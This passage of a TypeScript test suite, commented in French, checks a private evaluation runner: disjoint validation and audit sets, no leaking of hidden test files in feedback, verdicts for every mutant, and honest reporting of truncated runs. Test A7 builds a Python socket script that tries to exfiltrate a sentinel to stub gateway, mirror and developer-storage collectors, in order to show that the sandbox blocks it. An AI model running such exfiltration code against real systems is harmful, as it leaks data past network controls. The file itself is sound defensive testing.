    'T20.A3 — validation et audit utilisent des jeux distincts',
    async () => {
      assertLoaded();
      requireRole('listEvaluationScenarioIds');

      const rVal = await appeler('listEvaluationScenarioIds', 'validation');
      const rAud = await appeler('listEvaluationScenarioIds', 'audit');
      expect(
        rVal.ok ? 'jeu-validation-obtenu' : `JEU-VALIDATION-EN-ECHEC ${messageDe((rVal as { err: unknown }).err)}`,
      ).toBe('jeu-validation-obtenu');
      expect(
        rAud.ok ? 'jeu-audit-obtenu' : `JEU-AUDIT-EN-ECHEC ${messageDe((rAud as { err: unknown }).err)}`,
      ).toBe('jeu-audit-obtenu');

      const jeuValidation = (rVal as { ok: true; value: unknown }).value;
      const jeuAudit = (rAud as { ok: true; value: unknown }).value;
      expect(Array.isArray(jeuValidation) ? 'jeu-validation-est-un-tableau' : `JEU-VALIDATION-PAS-UN-TABLEAU ${rendu(jeuValidation)}`).toBe(
        'jeu-validation-est-un-tableau',
      );
      expect(Array.isArray(jeuAudit) ? 'jeu-audit-est-un-tableau' : `JEU-AUDIT-PAS-UN-TABLEAU ${rendu(jeuAudit)}`).toBe(
        'jeu-audit-est-un-tableau',
      );
      const validation = jeuValidation as unknown[];
      const audit = jeuAudit as unknown[];

      // CONTROLES DE NON-VACUITE : sans eux, DEUX jeux vides rendraient
      // l'intersection vide et le cas vert a tort (cases.lock.json le nomme
      // explicitement).
      expect(
        validation.length > 0 ? 'jeu-validation-non-vide' : 'JEU-VALIDATION-VIDE — controle non concluant',
      ).toBe('jeu-validation-non-vide');
      expect(audit.length > 0 ? 'jeu-audit-non-vide' : 'JEU-AUDIT-VIDE — controle non concluant').toBe(
        'jeu-audit-non-vide',
      );

      // PRINCIPAL : intersection vide.
      const setAudit = new Set(audit.map((x) => rendu(x)));
      const intersection = validation.filter((x) => setAudit.has(rendu(x)));
      expect(
        intersection.length === 0
          ? 'jeux-disjoints'
          : `JEUX-NON-DISJOINTS intersection=${rendu(intersection)}`,
      ).toBe('jeux-disjoints');
    },
    CASE_TIMEOUT_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A4 */
  test(
    'T20.A4 — retour borne contient le cas operationnel autorise sans reveler le fichier de test cache',
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const dev = nouvelEtatDeveloppeur('a4');
      const marqueurOperationnel = `OPERATIONAL-VISIBLE-${nomUnique('op')}`;
      const cheminFichierCache = `/private/hidden-tests/case-${nomUnique('secret')}.spec.ts`;
      const texteAssertionCachee = `assertHiddenBusinessRule_${nomUnique('rule')}`;

      const res = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a4'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests: [
          { caseId: marqueurOperationnel, script: 'exit 0', operational: true },
          {
            caseId: `hidden-${nomUnique('h')}`,
            script: `echo "${texteAssertionCachee}" >/dev/null; exit 1`,
            operational: false,
            hiddenFilePath: cheminFichierCache,
          },
        ],
      });
      expect(res.ok ? 'evaluation-executee' : `EVALUATION-EN-ECHEC ${messageDe((res as { err: unknown }).err)}`).toBe(
        'evaluation-executee',
      );
      const r = assertResultShape((res as { ok: true; value: unknown }).value, 'a4');
      const texteFeedback = rendu(r.boundedFeedback);

      // (moitie faible, deja vraie sous un stub) : le cas operationnel est
      // repere dans le retour borne.
      expect(
        texteFeedback.includes(marqueurOperationnel)
          ? 'cas-operationnel-present'
          : `CAS-OPERATIONNEL-ABSENT-DU-RETOUR ${court(texteFeedback)}`,
      ).toBe('cas-operationnel-present');

      // PRINCIPAL, DECISIF : ni le chemin du fichier de test cache, ni le
      // texte de son assertion, n'apparaissent dans le retour borne.
      expect(
        !texteFeedback.includes(cheminFichierCache)
          ? 'fichier-cache-non-revele'
          : `FICHIER-CACHE-REVELE-A-TORT ${court(texteFeedback)}`,
      ).toBe('fichier-cache-non-revele');
      expect(
        !texteFeedback.includes(texteAssertionCachee)
          ? 'assertion-cachee-non-revelee'
          : `ASSERTION-CACHEE-REVELEE-A-TORT ${court(texteFeedback)}`,
      ).toBe('assertion-cachee-non-revelee');
    },
    CASE_TIMEOUT_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A5 */
  test(
    'T20.A5 — temoins et mutants T10 donnent toujours leurs verdicts',
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const catWitnesses = await appeler('listWitnesses');
      expect(
        catWitnesses.ok ? 'catalogue-temoins-obtenu' : `CATALOGUE-TEMOINS-EN-ECHEC ${messageDe((catWitnesses as { err: unknown }).err)}`,
      ).toBe('catalogue-temoins-obtenu');
      const entreesWitnesses = Array.isArray((catWitnesses as { ok: true; value: unknown }).value)
        ? ((catWitnesses as { ok: true; value: unknown }).value as unknown[])
        : [];
      const nomDe = (e: unknown): string | null => {
        const o = e as Json | null;
        for (const cle of ['name', 'nom', 'id', 'witness', 'temoin']) {
          const v = o?.[cle];
          if (typeof v === 'string' && v.trim() !== '') return v;
        }
        return null;
      };
      const conforme = entreesWitnesses.find((e) => {
        const o = e as Json | null;
        return o?.conforming === true || o?.conforme === true;
      });
      const nomConforme = nomDe(conforme);
      expect(
        nomConforme !== null ? 'temoin-conforme-nomme' : `CATALOGUE-SANS-TEMOIN-CONFORME ${court(rendu(entreesWitnesses))}`,
      ).toBe('temoin-conforme-nomme');

      const regMutants = await appeler('listSemanticMutants');
      expect(
        regMutants.ok ? 'registre-mutants-obtenu' : `REGISTRE-MUTANTS-EN-ECHEC ${messageDe((regMutants as { err: unknown }).err)}`,
      ).toBe('registre-mutants-obtenu');
      const entreesMutants = Array.isArray((regMutants as { ok: true; value: unknown }).value)
        ? ((regMutants as { ok: true; value: unknown }).value as unknown[])
        : [];
      expect(
        entreesMutants.length >= 6
          ? 'registre-mutants-peuple'
          : `REGISTRE-MUTANTS-TROP-COURT ${String(entreesMutants.length)} < 6 : ${court(rendu(entreesMutants))}`,
      ).toBe('registre-mutants-peuple'); // cahier:L241

      const nomsMutants = entreesMutants
        .slice(0, 6)
        .map((e) => nomDe(e))
        .filter((n): n is string => n !== null);
      expect(
        nomsMutants.length === 6
          ? 'six-mutants-nommes'
          : `MUTANTS-SANS-NOM ${String(nomsMutants.length)}/6 : ${court(rendu(entreesMutants.slice(0, 6)))}`,
      ).toBe('six-mutants-nommes');

      const septNoms = [nomConforme as string, ...nomsMutants];
      expect(new Set(septNoms).size).toBe(7); // 1 temoin + 6 mutants nommes cahier:L241

      const dev = nouvelEtatDeveloppeur('a5');
      const hiddenTests = septNoms.map((n) => ({ caseId: n, script: 'exit 0' }));
      const res = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a5'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests,
      });
      expect(res.ok ? 'evaluation-executee' : `EVALUATION-EN-ECHEC ${messageDe((res as { err: unknown }).err)}`).toBe(
        'evaluation-executee',
      );
      const r = assertResultShape((res as { ok: true; value: unknown }).value, 'a5');

      // PRINCIPAL : chacun des SEPT rend un verdict defini — aucun ne
      // silencieusement disparait dans la plomberie de la copie privee.
      const manquants = septNoms.filter((n) => {
        const v = verdictDe(r, n);
        return v === undefined || typeof v.passed !== 'boolean';
      });
      expect(
        manquants.length === 0
          ? 'sept-verdicts-produits'
          : `VERDICTS-MANQUANTS-OU-INDEFINIS pour [${manquants.join(', ')}] : ${court(rendu(r.verdicts))}`,
      ).toBe('sept-verdicts-produits');
    },
    CASE_TIMEOUT_LOURD_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A6 */
  test(
    'T20.A6 — un test interrompu donne EVALUATION_INCOMPLETE, jamais un succes',
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const dev = nouvelEtatDeveloppeur('a6');
      const hiddenTests = [{ caseId: 'A6-case', script: 'sleep 60; exit 0' }];

      // CONTROLE : SANS interruption simulee, l'evaluation ABOUTIT — sans ce
      // controle, un runner qui repond TOUJOURS EVALUATION_INCOMPLETE
      // verdirait A6 sans avoir distingue une interruption d'un succes.
      const resControle = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a6-ctrl'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests: [{ caseId: 'A6-case-rapide', script: 'exit 0' }],
      });
      expect(
        resControle.ok ? 'run-controle-execute' : `RUN-CONTROLE-EN-ECHEC ${messageDe((resControle as { err: unknown }).err)}`,
      ).toBe('run-controle-execute');
      const rControle = assertResultShape((resControle as { ok: true; value: unknown }).value, 'a6-controle');
      expect(
        rControle.status === 'COMPLETED' ? 'run-controle-complete' : `RUN-CONTROLE-NON-COMPLETE ${rendu(rControle.status)}`,
      ).toBe('run-controle-complete'); // cahier:L97

      // PRINCIPAL : avec le point d'injection NOMME (L141), l'execution est
      // tronquee, et le statut ne pretend JAMAIS un succes.
      const resTronque = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a6'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests,
        simulateTruncatedExecution: true,
      });
      expect(
        resTronque.ok ? 'run-tronque-execute' : `RUN-TRONQUE-EN-ECHEC ${messageDe((resTronque as { err: unknown }).err)}`,
      ).toBe('run-tronque-execute');
      const rTronque = assertResultShape((resTronque as { ok: true; value: unknown }).value, 'a6-tronque');
      expect(
        rTronque.status !== 'COMPLETED'
          ? 'execution-tronquee-non-declaree-complete'
          : `EXECUTION-TRONQUEE-DECLAREE-COMPLETE-A-TORT ${rendu(rTronque)}`,
      ).toBe('execution-tronquee-non-declaree-complete');
      expect(
        rTronque.status === 'EVALUATION_INCOMPLETE'
          ? 'statut-evaluation-incomplete'
          : `STATUT-INATTENDU ${rendu(rTronque.status)}`,
      ).toBe('statut-evaluation-incomplete'); // cahier:L333
      expect(
        typeof rTronque.reason === 'string' && rTronque.reason.trim() !== ''
          ? 'motif-present'
          : `MOTIF-ABSENT ${rendu(rTronque.reason)}`,
      ).toBe('motif-present');
    },
    CASE_TIMEOUT_MS,
  );

  /* ─────────────────────────────────────────────────────────────── A7 */
  test(
    "T20.A7 — exfiltration de la sentinelle via passerelle/miroir/stockage developpeur : zero reception cote collecteurs",
    async () => {
      assertLoaded();
      requireRole('runPrivateEvaluation');

      const talonPasserelle = await talonNomme('passerelle');
      const talonMiroir = await talonNomme('miroir-documentaire');
      const talonStockageDev = await talonNomme('stockage-developpement');
      const talonAutorise = await talonNomme('service-prive-autorise');

      const dev = nouvelEtatDeveloppeur('a7');
      const SENTINEL = sentinelle('a7');

      // `script` traverse un `/bin/sh -c "$2"` interne (packages/sandbox/src/
      // runtime.ts, execIn) qui REPARSE tout son texte comme du code shell —
      // ce n'est pas une simple substitution positionnelle a ce niveau-la.
      // `JSON.stringify(data)` emet des guillemets DOUBLES non echappes ; des
      // lors qu'ils atterrissent dans un bloc deja englobe par des guillemets
      // doubles (`python3 -c "..."`), ce sh les interprete comme la fin (puis
      // la reouverture) de la chaine englobante : les guillemets disparaissent
      // du texte reconstruit et l'argument python obtenu n'est plus le
      // litteral JSON voulu, mais du code python NU (`send(h, p, <SENTINEL
      // sans guillemets>)`), qui leve un NameError avant le moindre appel
      // socket — y compris pour le service AUTORISE, rendant le CONTROLE
      // (censé prouver que le reseau n'est pas totalement bloque) inconcluant
      // pour une mauvaise raison : un bug de construction de fixture, pas une
      // politique reseau. Encoder host/data en hexadecimal (alphabet
      // 0-9a-f, aucun caractere de guillemet a aucun niveau) et les decoder
      // cote python retire ce risque de reinterpretation quel que soit le
      // contenu, sans changer ce que le cas verifie.
      const versHex = (s: string): string => Buffer.from(s, 'utf8').toString('hex');
      const envoyer = (host: string, port: number, data: string): string =>
        `send(bytes.fromhex('${versHex(host)}').decode(), ${port}, bytes.fromhex('${versHex(data)}').decode())`;
      const script =
        'python3 -c "\n' +
        'import socket\n' +
        'def send(h,p,data):\n' +
        '    try:\n' +
        '        s=socket.create_connection((h,int(p)),timeout=2); s.sendall(data.encode()); s.close()\n' +
        '    except Exception:\n' +
        '        pass\n' +
        `${envoyer(talonPasserelle.host, talonPasserelle.port, SENTINEL)}\n` +
        `${envoyer(talonMiroir.host, talonMiroir.port, SENTINEL)}\n` +
        `${envoyer(talonStockageDev.host, talonStockageDev.port, SENTINEL)}\n` +
        `${envoyer(talonAutorise.host, talonAutorise.port, 'PING-OK')}\n` +
        'print(\'EXFIL-ATTEMPT-DONE\')\n' +
        '"';

      const res = await appeler('runPrivateEvaluation', {
        trajectoryId: nomUnique('traj-a7'),
        kind: 'validation',
        developerDsn: dev.dsn,
        developerFilesDir: dev.filesDir,
        developerLogsDir: dev.logsDir,
        hiddenTests: [{ caseId: 'A7-exfil-attempt', script }],
        allowedEgress: [{ label: 'service-prive-autorise', host: talonAutorise.host, port: talonAutorise.port }],
      });
      expect(res.ok ? 'evaluation-executee' : `EVALUATION-EN-ECHEC ${messageDe((res as { err: unknown }).err)}`).toBe(
        'evaluation-executee',
      );
      assertResultShape((res as { ok: true; value: unknown }).value, 'a7');

      // Laisse le temps a une connexion egaree d'arriver avant de compter.
      await new Promise((r) => setTimeout(r, 500));

      // CONTROLE : le service prive explicitement autorise a bien recu son
      // ping — sans lui, un profil qui bloque TOUT le reseau verdirait A7
      // sans distinguer liste blanche et black-hole total.
      expect(
        receptionDe(talonAutorise, 'PING-OK')
          ? 'service-autorise-a-recu'
          : 'SERVICE-AUTORISE-N-A-RIEN-RECU — reseau completement bloque, controle non concluant',
      ).toBe('service-autorise-a-recu');

      // PRINCIPAL : AUCUN des trois collecteurs interdits n'a recu la
      // sentinelle — l'assertion decisive nommee par le cahier (L333 : « zero
      // reception de la sentinelle cote collecteurs »).
      for (const talon of [talonPasserelle, talonMiroir, talonStockageDev]) {
        expect(
          !receptionDe(talon, SENTINEL)
            ? `${talon.label}-zero-reception-sentinelle`
            : `${talon.label}-A-RECU-LA-SENTINELLE-A-TORT`,
        ).toBe(`${talon.label}-zero-reception-sentinelle`);
      }
    },
    CASE_TIMEOUT_LOURD_MS,
  );
});
